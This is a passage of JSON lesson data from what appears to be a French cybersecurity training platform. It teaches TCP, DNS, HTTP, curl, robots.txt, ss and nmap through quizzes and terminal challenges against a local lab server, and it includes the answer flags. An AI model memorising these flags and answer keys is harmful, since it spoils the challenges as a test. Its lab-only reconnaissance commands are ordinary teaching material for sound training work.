          },
          {
            "num": 2,
            "text": "Client  ➔ Serveur : [SYN]     Seq=0"
          },
          {
            "num": 3,
            "text": "Serveur ➔ Client  : [SYN,ACK] Seq=0 Ack=1",
            "isCritical": true,
            "note": "Le serveur confirme la demande de connexion du client"
          },
          {
            "num": 4,
            "text": "Client  ➔ Serveur : [ACK]     Seq=1 Ack=1 (Connexion ESTABLISHED)"
          }
        ],
        "prompt": "Clique sur le paquet dans lequel le serveur répond favorablement à la demande :"
      },
      "tokenPuzzle": {
        "instruction": "Ordonne chronologiquement les 3 étapes de la poignée de main TCP :",
        "tokens": [
          "SYN",
          "SYN-ACK",
          "ACK",
          "FIN"
        ],
        "correctOrder": [
          "SYN",
          "SYN-ACK",
          "ACK"
        ]
      },
      "quickQuiz": {
        "prompt": "Quel paquet le serveur envoie-t-il au client en réponse au premier paquet SYN lors du handshake TCP ?",
        "options": [
          {
            "text": "Un paquet ICMP Ping Echo.",
            "isCorrect": false,
            "debrief": "Faux. ICMP est un protocole distinct de TCP."
          },
          {
            "text": "Une clé privée SSH chiffrée.",
            "isCorrect": false,
            "debrief": "Faux. Le handshake TCP précède toute couche applicative SSH ou TLS."
          },
          {
            "text": "Un paquet SYN-ACK (accusé de réception combiné à sa propre demande de synchronisation).",
            "isCorrect": true,
            "debrief": "Exact ! Le serveur synchronise son propre numéro de séquence tout en accusant réception du client."
          },
          {
            "text": "Un paquet FIN-RST (fermeture de port d'urgence).",
            "isCorrect": false,
            "debrief": "Faux. RST sert à refuser la connexion."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Dans le terminal, tape 'cat /var/log/auth.log' pour repérer l'événement d'authentification SSH établi suite au handshake. Soumets la première phrase de réussite (Accepted password for operator) !",
      "flag": "Accepted password for operator"
    }
  },
  {
    "id": "m2-l6",
    "unitId": "m2",
    "title": "6. L'Annuaire du Web : Le Système DNS",
    "icon": "📖",
    "xp": 40,
    "lessonSlides": [
      {
        "title": "Pourquoi le DNS Existe-t-il ?",
        "bullets": [
          "Les humains sont très doués pour retenir des noms comme `google.com` ou `cyberlab.local`.",
          "Les machines, en revanche, ne comprennent que des adresses IP binaires (comme `142.250.179.206`).",
          "Le **DNS** (Domain Name System) est l'annuaire universel d'Internet qui traduit automatiquement un nom de domaine en adresse IP."
        ]
      },
      {
        "title": "Comment Interroger le DNS : dig & resolv.conf",
        "bullets": [
          "Le fichier `/etc/resolv.conf` contient l'adresse IP du serveur DNS que ton ordinateur consulte à chaque fois que tu navigues.",
          "Les outils en ligne de commande `dig` ou `nslookup` permettent d'interroger directement un serveur DNS pour lui demander l'IP d'un site.",
          "Exemple : `dig google.com` renvoie un enregistrement de type **A** (adresse IPv4)."
        ],
        "syntaxBox": {
          "command": "cat /etc/resolv.conf",
          "description": "Affiche le serveur de noms (nameserver) configuré sur la machine.",
          "example": "nameserver 127.0.0.53"
        }
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"30\" width=\"110\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"80\" y=\"55\" fill=\"#38bdf8\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">google.com</text>\n          <text x=\"80\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Nom de domaine</text>\n          <path d=\"M 145 60 L 245 60\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n          <text x=\"195\" y=\"50\" fill=\"#fbbf24\" font-size=\"10\" font-family=\"monospace\" text-anchor=\"middle\">DNS Lookup</text>\n          <rect x=\"255\" y=\"30\" width=\"120\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"315\" y=\"55\" fill=\"#34d399\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">142.250.179.206</text>\n          <text x=\"315\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Adresse IP Cible</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "# Découvre quel serveur DNS est interrogé par le système :"
          },
          {
            "num": 2,
            "text": "operator@cyberlab:~$ cat /etc/resolv.conf",
            "isCritical": true,
            "note": "nameserver indique l'adresse du résolveur DNS local"
          },
          {
            "num": 3,
            "text": "nameserver 127.0.0.53"
          },
          {
            "num": 4,
            "text": "search aegis.local"
          }
        ],
        "prompt": "Clique sur la commande qui révèle le fichier de configuration DNS :"
      },
      "tokenPuzzle": {
        "instruction": "Tape la commande pour afficher la configuration du résolveur DNS :",
        "tokens": [
          "cat",
          "/etc/resolv.conf",
          "ping",
          "whoami"
        ],
        "correctOrder": [
          "cat",
          "/etc/resolv.conf"
        ]
      },
      "quickQuiz": {
        "prompt": "Quel est le rôle principal du système DNS sur Internet ?",
        "options": [
          {
            "text": "Traduire des noms de domaines compréhensibles par les humains en adresses IP utilisables par les machines.",
            "isCorrect": true,
            "debrief": "Bravo ! C'est la fonction fondamentale de l'annuaire DNS."
          },
          {
            "text": "Accélérer la vitesse de calcul du processeur central de l'ordinateur.",
            "isCorrect": false,
            "debrief": "Faux. Le DNS est un protocole réseau, pas une accélération CPU."
          },
          {
            "text": "Sauvegarder l'ensemble des fichiers personnels dans le cloud.",
            "isCorrect": false,
            "debrief": "Faux. C'est le rôle des services de sauvegarde."
          },
          {
            "text": "Bloquer physiquement les virus sur le disque dur.",
            "isCorrect": false,
            "debrief": "Faux. C'est le travail de l'antivirus / EDR."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Dans le terminal, tape 'cat /etc/resolv.conf'. Repère l'adresse IP du nameserver configuré et soumets-la !",
      "flag": "127.0.0.53"
    }
  },
  {
    "id": "m2-l7",
    "unitId": "m2",
    "title": "7. Le Protocole HTTP sous le Capot",
    "icon": "📄",
    "xp": 40,
    "lessonSlides": [
      {
        "title": "HTTP : Du Texte Brut et Rien d'Autre",
        "bullets": [
          "Chaque page web que tu visites est demandée via le protocole **HTTP** (Hypertext Transfer Protocol).",
          "Sous le capot, HTTP n'a rien de mystique : c'est simplement du **texte brut en anglais** envoyé sur le port 80 ou 443.",
          "Une requête HTTP commence par une ligne de commande contenant un **Verbe** (méthode), un **Chemin** et une version."
        ]
      },
      {
        "title": "Les Verbes et les En-Têtes (Headers)",
        "bullets": [
          "• `GET /index.html HTTP/1.1` : demande au serveur de renvoyer la page d'accueil.",
          "• `POST /login HTTP/1.1` : envoie des données (comme un formulaire d'identifiant et mot de passe).",
          "• `Host: cyberlab.local` : en-tête obligatoire qui précise quel site web on veut sur ce serveur.",
          "• `User-Agent: Mozilla/...` : informe le serveur du type de navigateur utilisé."
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"20\" width=\"350\" height=\"80\" rx=\"8\" fill=\"#030712\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"40\" y=\"45\" fill=\"#38bdf8\" font-size=\"11\" font-family=\"monospace\" font-weight=\"bold\">GET / HTTP/1.1</text>\n          <text x=\"40\" y=\"65\" fill=\"#94a3b8\" font-size=\"10\" font-family=\"monospace\">Host: localhost:3333</text>\n          <text x=\"40\" y=\"82\" fill=\"#94a3b8\" font-size=\"10\" font-family=\"monospace\">User-Agent: curl/8.5.0</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "# Exécute une requête HTTP directe vers le serveur local :"
          },
          {
            "num": 2,
            "text": "operator@cyberlab:~$ curl http://localhost:3333/",
            "isCritical": true,
            "note": "curl émet une véritable requête GET HTTP brute"
          },
          {
            "num": 3,
            "text": "<!DOCTYPE html><html><head><title>CyberRange PRO</title>..."
          }
        ],
        "prompt": "Clique sur la commande curl qui envoie une requête HTTP GET :"
      },
      "tokenPuzzle": {
        "instruction": "Tape la commande curl pour interroger la racine de notre serveur local :",
        "tokens": [
          "curl",
          "http://localhost:3333/",
          "cat",
          "whoami"
        ],
        "correctOrder": [
          "curl",
          "http://localhost:3333/"
        ]
      },
      "quickQuiz": {
        "prompt": "Quel verbe (méthode) HTTP est standardisé pour demander la consultation d'une ressource sans modifier le serveur ?",
        "options": [
          {
            "text": "DELETE (méthode de suppression définitive).",
            "isCorrect": false,
            "debrief": "Faux. DELETE demande la suppression de la ressource."
          },
          {
            "text": "PURGE (méthode de purge de cache).",
            "isCorrect": false,
            "debrief": "Faux. Ce n'est pas un verbe HTTP standard de base."
          },
          {
            "text": "CONNECT (méthode de tunnelisation de socket).",
            "isCorrect": false,
            "debrief": "Faux. CONNECT sert aux proxies SSL/TLS."
          },
          {
            "text": "GET (méthode standard de consultation et de récupération de données).",
            "isCorrect": true,
            "debrief": "Exact ! GET sert à consulter, tandis que POST ou PUT envoient des modifications."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Dans le terminal, tape 'curl http://localhost:3333/'. Repère le titre HTML de l'application dans la balise <title> et soumets son contenu exact (CyberRange PRO) !",
      "flag": "CyberRange PRO"
    }
  },
  {
    "id": "m2-l8",
    "unitId": "m2",
    "title": "8. Les Codes de Statut HTTP",
    "icon": "🚦",
    "xp": 40,
    "lessonSlides": [
      {
        "title": "La Réponse du Serveur : Les Codes à 3 Chiffres",
        "bullets": [
          "Quand un serveur répond à ta requête HTTP, la toute première ligne contient un **code de statut à trois chiffres** qui résume le sort de ta demande.",
          "Ces codes sont classés en 5 grandes familles logiques selon leur premier chiffre."
        ]
      },
      {
        "title": "Les Grandes Familles de Codes",
        "bullets": [
          "• **2xx (Succès)** : `200 OK` (Tout s'est déroulé parfaitement, voici le document).",
          "• **3xx (Redirection)** : `301 Moved Permanently` (La page a déménagé vers une nouvelle URL).",
          "• **4xx (Erreur Client)** : `403 Forbidden` (Tu n'as pas le droit), `404 Not Found` (La page demandée n'existe pas).",
          "• **5xx (Erreur Serveur)** : `500 Internal Server Error` (Le code backend a planté suite à un bug ou une injection) !"
        ],
        "syntaxBox": {
          "command": "curl -I http://localhost:3333/",
          "description": "Envoie une requête HEAD pour afficher uniquement les en-têtes et le code de statut HTTP.",
          "example": "HTTP/1.1 200 OK"
        }
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"30\" width=\"80\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"65\" y=\"55\" fill=\"#34d399\" font-size=\"12\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">200 OK</text>\n          <text x=\"65\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Succès</text>\n          <rect x=\"115\" y=\"30\" width=\"80\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#3b82f6\" stroke-width=\"2\"/>\n          <text x=\"155\" y=\"55\" fill=\"#60a5fa\" font-size=\"12\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">301 Move</text>\n          <text x=\"155\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Redirection</text>\n          <rect x=\"205\" y=\"30\" width=\"80\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n          <text x=\"245\" y=\"55\" fill=\"#fbbf24\" font-size=\"12\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">404 Lost</text>\n          <text x=\"245\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Non trouvé</text>\n          <rect x=\"295\" y=\"30\" width=\"80\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#f43f5e\" stroke-width=\"2\"/>\n          <text x=\"335\" y=\"55\" fill=\"#f87171\" font-size=\"12\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">500 Crash</text>\n          <text x=\"335\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Bug Serveur</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "# Affiche uniquement les en-têtes HTTP de la réponse :"
          },
          {
            "num": 2,
            "text": "operator@cyberlab:~$ curl -I http://localhost:3333/",
            "isCritical": true,
            "note": "L'option -I envoie une requête HEAD pour obtenir le code de statut"
          },
          {
            "num": 3,
            "text": "HTTP/1.1 200 OK"
          },
          {
            "num": 4,
            "text": "Content-Type: text/html; charset=utf-8"
          }
        ],
        "prompt": "Clique sur la commande qui inspecte les en-têtes et le code de statut :"
      },
      "tokenPuzzle": {
        "instruction": "Tape la commande curl avec option -I pour inspecter les en-têtes du serveur :",
        "tokens": [
          "curl",
          "-I",
          "http://localhost:3333/",
          "cat"
        ],
        "correctOrder": [
          "curl",
          "-I",
          "http://localhost:3333/"
        ]
      },
      "quickQuiz": {
        "prompt": "Quelle famille de codes de statut HTTP indique que le serveur a rencontré une erreur interne ou a planté ?",
        "options": [
          {
            "text": "La famille 3xx (Redirection).",
            "isCorrect": false,
            "debrief": "Faux. 3xx indique une redirection vers une autre adresse."
          },
          {
            "text": "La famille 2xx (Succès).",
            "isCorrect": false,
            "debrief": "Faux. 2xx signifie que tout a parfaitement fonctionné."
          },
          {
            "text": "La famille 1xx (Information préliminaire).",
            "isCorrect": false,
            "debrief": "Faux. 1xx indique un statut intermédiaire purement informatif."
          },
          {
            "text": "La famille 5xx (ex: 500 Internal Server Error, 502 Bad Gateway).",
            "isCorrect": true,
            "debrief": "Exact ! 5xx signifie que la faute incombe au serveur distant."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Dans le terminal, tape 'curl -I http://localhost:3333/'. Soumets le code et le message de statut exact retourné (ex: 200 OK) !",
      "flag": "200 OK"
    }
  },
  {
    "id": "m2-mid",
    "unitId": "m2",
    "title": "ÉVALUATION MI-PARCOURS : RECONNAISSANCE RÉSEAU & AUDIT D'EN-TÊTES",
    "icon": "🛡️",
    "isCheckpoint": true,
    "xp": 75,
    "lessonSlides": [
      {
        "title": "AUDIT D'INFRASTRUCTURE : Passerelle Interne Restreinte",
        "bullets": [
          "Le département infrastructure a déployé un micro-service de diagnostic interne sur le port 3333 : `/api/network/audit-eval`.",
          "Pour empêcher les accès non autorisés, le service bloque toute requête HTTP standard qui ne contient pas l'en-tête de scan d'audit de conformité.",
          "Cette épreuve récapitule : connectivité IP, ports d'écoute, requêtes HTTP, manipulation des en-têtes et analyse de réponses brutes."
        ]
      },
      {
        "title": "Consignes de la Mission d'Audit (Sans Guidage)",
        "bullets": [
          "1. Analyse le point d'accès d'évaluation d'infrastructure : `http://127.0.0.1:3333/api/network/audit-eval`.",
          "2. Forge une requête `curl` en lui passant l'en-tête d'audit requis : `-H \"X-Security-Scan: enabled\"`.",
          "3. Analyse la réponse JSON retournée par le serveur et soumets le token de conformité officiel !"
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 500 130\" class=\"w-full h-full\">\n          <rect width=\"500\" height=\"130\" rx=\"12\" fill=\"#0f172a\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n          <circle cx=\"65\" cy=\"65\" r=\"32\" fill=\"#f59e0b\" fill-opacity=\"0.15\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n          <text x=\"65\" y=\"74\" fill=\"#f59e0b\" font-size=\"28\" text-anchor=\"middle\">🛡️</text>\n          <text x=\"120\" y=\"45\" fill=\"#f8fafc\" font-size=\"14\" font-family=\"monospace\" font-weight=\"bold\">CHECKPOINT RÉSEAU MI-PARCOURS</text>\n          <text x=\"120\" y=\"70\" fill=\"#94a3b8\" font-size=\"11\" font-family=\"monospace\">Cible : http://127.0.0.1:3333/api/network/audit-eval</text>\n          <rect x=\"120\" y=\"85\" width=\"350\" height=\"26\" rx=\"6\" fill=\"#1e293b\" stroke=\"#334155\"/>\n          <text x=\"130\" y=\"102\" fill=\"#f59e0b\" font-size=\"11\" font-family=\"monospace\">Condition : En-tête X-Security-Scan: enabled</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "# Audit réseau : injection d'en-tête d'autorisation personnalisé"
          },
          {
            "num": 2,
            "text": "operator@cyberlab:~$ curl -H 'X-Security-Scan: enabled' http://127.0.0.1:3333/api/network/audit-eval",
            "isCritical": true,
            "note": "L'option -H permet de transmettre des en-têtes personnalisés au serveur"
          },
          {
            "num": 3,
            "text": "{\"audit\":\"AUTHORIZED\",\"status\":\"SECURITY_PASSED\",\"token\":\"CYBER{NET_MID_EVAL_RECON_HEADER_AUTHORIZED}\"}"
          }
        ],
        "prompt": "Clique sur la ligne curl qui transmet l'en-tête d'audit pour franchir la restriction du serveur :"
      },
      "tokenPuzzle": {
        "instruction": "Reconstitue la commande curl avec l'en-tête d'audit pour interroger la passerelle :",
        "tokens": [
          "curl",
          "-H",
          "'X-Security-Scan: enabled'",
          "http://127.0.0.1:3333/api/network/audit-eval",
          "ping"
        ],
        "correctOrder": [
          "curl",
          "-H",
          "'X-Security-Scan: enabled'",
          "http://127.0.0.1:3333/api/network/audit-eval"
        ]
      },
      "quickQuiz": {
        "prompt": "Quelle option de la commande 'curl' permet d'ajouter un en-tête HTTP arbitraire à une requête ?",
        "options": [
          {
            "text": "L'option -X (qui sert en réalité à changer le verbe HTTP, ex: -X POST).",
            "isCorrect": false,
            "debrief": "Faux. -X définit la méthode HTTP (GET, POST, PUT), pas les en-têtes."
          },
          {
            "text": "L'option -u (Username, pour l'authentification HTTP basique).",
            "isCorrect": false,
            "debrief": "Faux. -u gère le couple utilisateur:mot-de-passe en Base64."
          },
          {
            "text": "L'option -H (Header), permettant de spécifier 'Nom-Entete: Valeur'.",
            "isCorrect": true,
            "debrief": "Exact ! curl -H 'Header: Value' est la syntaxe standard pour forger des en-têtes HTTP."
          },
          {
            "text": "L'option -d (Data, utilisée pour le corps de requête).",
            "isCorrect": false,
            "debrief": "Faux. -d envoie les données de payload dans le body."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Dans le terminal, utilise 'curl' avec l'en-tête 'X-Security-Scan: enabled' pour interroger 'http://127.0.0.1:3333/api/network/audit-eval'. Soumets la valeur du TOKEN retourné !",
      "flag": "CYBER{NET_MID_EVAL_RECON_HEADER_AUTHORIZED}"
    }
  },
  {
    "id": "m2-l9",
    "unitId": "m2",
    "title": "9. Le Couteau Suisse Réseau : curl",
    "icon": "🧰",
    "xp": 45,
    "lessonSlides": [
      {
        "title": "L'Outil le Plus Utilisé au Monde : curl",
        "bullets": [
          "`curl` (Client URL) est un outil universel présent sur tous les systèmes Linux et Windows pour transférer des données via une multitude de protocoles.",
          "Contrairement à un navigateur qui télécharge des images et exécute du JavaScript, `curl` récupère le **contenu brut sans fioriture**.",
          "C'est l'arme absolue pour inspecter des réponses d'API et tester des requêtes HTTP personnalisées."
        ]
      },
      {
        "title": "La Recherche du Fichier robots.txt",
        "bullets": [
          "Sur le web, presque tous les sites possèdent un fichier spécial nommé `/robots.txt`.",
          "Ce fichier indique aux moteurs de recherche (Google, Bing) quels dossiers ils ne doivent pas indexer.",
          "Pour un pentesteur, c'est une mine d'or : les administrateurs y listent souvent les répertoires secrets qu'ils veulent cacher au public !"
        ],
        "syntaxBox": {
          "command": "curl http://localhost:3333/robots.txt",
          "description": "Télécharge et affiche le fichier robots.txt du serveur local.",
          "example": "User-agent: * Disallow: /admin FLAG=CYBER{...}"
        }
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"30\" y=\"30\" width=\"130\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"95\" y=\"55\" fill=\"#38bdf8\" font-size=\"12\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">curl URL</text>\n          <text x=\"95\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Client HTTP</text>\n          <path d=\"M 170 60 L 230 60\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <rect x=\"240\" y=\"30\" width=\"130\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"305\" y=\"55\" fill=\"#34d399\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">/robots.txt</text>\n          <text x=\"305\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Pages cachées</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "# Télécharge le fichier d'exclusion des moteurs de recherche :"
          },
          {
            "num": 2,
            "text": "operator@cyberlab:~$ curl http://localhost:3333/robots.txt",
            "isCritical": true,
            "note": "curl extrait le texte brut de robots.txt sans passer par un navigateur"
          },
          {
            "num": 3,
            "text": "User-agent: *"
          },
          {
            "num": 4,
            "text": "Disallow: /admin-secret-portal"
          },
          {
            "num": 5,
            "text": "FLAG=CYBER{HTTP_GET_ROBOTS_TXT_FOUND}"
          }
        ],
        "prompt": "Clique sur la commande curl qui télécharge robots.txt :"
      },
      "tokenPuzzle": {
        "instruction": "Tape la commande pour télécharger robots.txt avec curl :",
        "tokens": [
          "curl",
          "http://localhost:3333/robots.txt",
          "cat",
          "ping"
        ],
        "correctOrder": [
          "curl",
          "http://localhost:3333/robots.txt"
        ]
      },
      "quickQuiz": {
        "prompt": "Pourquoi les auditeurs en cybersécurité inspectent-ils systématiquement le fichier /robots.txt d'une cible ?",
        "options": [
          {
            "text": "Parce qu'il contient la clé de déchiffrement du disque dur du serveur.",
            "isCorrect": false,
            "debrief": "Faux. robots.txt est un simple fichier texte public d'indexation."
          },
          {
            "text": "Parce qu'il désactive le pare-feu du fournisseur d'accès.",
            "isCorrect": false,
            "debrief": "Faux. Il n'a aucun impact sur les pare-feux."
          },
          {
            "text": "Parce qu'il liste souvent explicitement les dossiers et panneaux d'administration confidentiels que le site souhaite masquer.",
            "isCorrect": true,
            "debrief": "Exact ! Le fichier robots.txt révèle souvent sans le vouloir les chemins les plus sensibles."
          },
          {
            "text": "Parce qu'il force le serveur à redémarrer en mode administrateur.",
            "isCorrect": false,
            "debrief": "Faux. C'est un document statique sans pouvoir exécutif."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Dans le terminal, tape 'curl http://localhost:3333/robots.txt'. Récupère le drapeau secret présent dans le fichier et soumets sa valeur CYBER{...} !",
      "flag": "CYBER{HTTP_GET_ROBOTS_TXT_FOUND}"
    }
  },
  {
    "id": "m2-l10",
    "unitId": "m2",
    "title": "10. Surveillance des Sockets avec ss",
    "icon": "👂",
    "xp": 45,
    "lessonSlides": [
      {
        "title": "La Prise de Température Réseau : ss",
        "bullets": [
          "Comment savoir quels programmes ouvrent des portes dérobées (backdoors) ou écoutent des connexions entrantes sur ta machine ?",
          "La commande `ss` (Socket Statistics, remplaçante moderne de `netstat`) interroge directement le noyau Linux pour afficher tous les points d'entrée ouverts."
        ]
      },
      {
        "title": "Comprendre l'État LISTEN",
        "bullets": [
          "Un port en état **LISTEN** est un port sur lequel un serveur attend patiemment qu'un client vienne lui parler.",
          "L'option `-t` filtre TCP, `-u` filtre UDP, `-l` affiche les sockets en écoute (**Listening**), et `-n` affiche les ports en chiffres plutôt qu'en noms de services.",
          "La formule magique que tout administrateur connaît est : `ss -tlpn`."
        ],
        "syntaxBox": {
          "command": "ss -tlpn",
          "description": "Liste tous les serveurs TCP en écoute avec leur PID et numéro de port.",
          "example": "LISTEN 0 128 0.0.0.0:3333"
        }
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"25\" width=\"350\" height=\"70\" rx=\"8\" fill=\"#030712\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"40\" y=\"50\" fill=\"#34d399\" font-size=\"11\" font-family=\"monospace\" font-weight=\"bold\">ss -tlpn (Sockets en écoute)</text>\n          <text x=\"40\" y=\"70\" fill=\"#94a3b8\" font-size=\"10\" font-family=\"monospace\">tcp LISTEN 0 128 *:3333 (CyberLab Server)</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "# Examine tous les sockets en écoute d'attente de connexion :"
          },
          {
            "num": 2,
            "text": "operator@cyberlab:~$ ss -tlpn",
            "isCritical": true,
            "note": "ss -tlpn liste tous les ports ouverts en état LISTEN"
          },
          {
            "num": 3,
            "text": "State  Recv-Q Send-Q Local Address:Port  Peer Address:Port"
          },
          {
            "num": 4,
            "text": "LISTEN 0      128          0.0.0.0:3333      0.0.0.0:*"
          }
        ],
        "prompt": "Clique sur la commande qui révèle les services en état LISTEN :"
      },
      "tokenPuzzle": {
        "instruction": "Tape la commande pour lister les sockets TCP en écoute sous forme numérique :",
        "tokens": [
          "ss",
          "-tlpn",
          "ping",
          "cat"
        ],
        "correctOrder": [
          "ss",
          "-tlpn"
        ]
      },
      "quickQuiz": {
        "prompt": "Que signifie l'état 'LISTEN' pour un socket réseau affiché par la commande ss ?",
        "options": [
          {
            "text": "Le processeur est saturé et le serveur est hors ligne.",
            "isCorrect": false,
            "debrief": "Faux. LISTEN indique un service en parfait état de fonctionnement."
          },
          {
            "text": "La connexion est terminée et les paquets ont été détruits.",
            "isCorrect": false,
            "debrief": "Faux. Une connexion fermée est TIME_WAIT ou CLOSED."
          },
          {
            "text": "Le port est définitivement bloqué par le pare-feu du système.",
            "isCorrect": false,
            "debrief": "Faux. Un port bloqué serait DROP ou REJECT, pas LISTEN."
          },
          {
            "text": "Le service est actif et attend qu'un client vienne établir une connexion sur ce port.",
            "isCorrect": true,
            "debrief": "Exact ! Le port est ouvert et attend un handshake SYN."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Dans le terminal, tape 'ss -tlpn'. Soumets l'état affiché pour le serveur écoutant sur le port 3333 (LISTEN) !",
      "flag": "LISTEN"
    }
  },
  {
    "id": "m2-l11",
    "unitId": "m2",
    "title": "11. Cartographier le Réseau avec nmap",
    "icon": "🧭",
    "xp": 50,
    "lessonSlides": [
      {
        "title": "Le Scanner de Référence Mondiale : nmap",
        "bullets": [
          "`nmap` (Network Mapper) est l'outil le plus célèbre et le plus redoutable de la boîte à outils du pirate éthique.",
          "Il permet de sonder une machine ou tout un réseau à distance pour découvrir : quelles machines sont allumées, quels ports sont ouverts, et quels logiciels y tournent.",
          "C'est la première étape indispensable de toute phase de reconnaissance (**Reconnaissance**)."
        ]
      },
      {
        "title": "Détecter les Versions avec -sV",
        "bullets": [
          "Savoir qu'un port 80 est ouvert est utile, mais savoir qu'il fait tourner *Apache version 2.4.49* (vulnérable à une faille critique) est infiniment plus précieux !",
          "L'option `-sV` (Service Version) envoie des sondes intelligentes pour contraindre le serveur à révéler sa marque et son numéro de version exacts.",
          "Exemple : `nmap -sV localhost`."
        ],
        "syntaxBox": {
          "command": "nmap -sV localhost",
          "description": "Scanne les ports ouverts sur localhost et détermine la version des services.",
          "example": "3333/tcp open http Node.js HTTP Server"
        }
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <circle cx=\"50\" cy=\"60\" r=\"30\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"50\" y=\"65\" fill=\"#38bdf8\" font-size=\"12\" font-family=\"monospace\" text-anchor=\"middle\">nmap</text>\n          <line x1=\"85\" y1=\"60\" x2=\"160\" y2=\"60\" stroke=\"#475569\" stroke-width=\"2\"/>\n          <rect x=\"170\" y=\"25\" width=\"200\" height=\"70\" rx=\"8\" fill=\"#0f172a\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"180\" y=\"50\" fill=\"#34d399\" font-size=\"11\" font-family=\"monospace\">PORT     STATE SERVICE</text>\n          <text x=\"180\" y=\"70\" fill=\"#38bdf8\" font-size=\"11\" font-family=\"monospace\">3333/tcp open  http</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "# Scanne la machine cible pour identifier les ports et versions de services :"
          },
          {
            "num": 2,
            "text": "operator@cyberlab:~$ nmap -sV localhost",
            "isCritical": true,
            "note": "nmap -sV détecte que le port 3333 est ouvert avec un service HTTP"
          },
          {
            "num": 3,
            "text": "PORT     STATE SERVICE VERSION"
          },
          {
            "num": 4,
            "text": "3333/tcp open  http    Node.js (CyberLab Platform)"
          }
        ],
        "prompt": "Clique sur la commande nmap qui cartographie les ports et versions :"
      },
      "tokenPuzzle": {
        "instruction": "Tape la commande nmap pour scanner les versions de services sur localhost :",
        "tokens": [
          "nmap",
          "-sV",
          "localhost",
          "ping"
        ],
        "correctOrder": [
          "nmap",
          "-sV",
          "localhost"
        ]
      },
      "quickQuiz": {
        "prompt": "Quel est l'objectif premier d'un scanner de ports comme nmap dans un audit de cybersécurité ?",
        "options": [
          {
            "text": "Identifier les machines accessibles, leurs ports ouverts et les versions des logiciels en écoute.",
            "isCorrect": true,
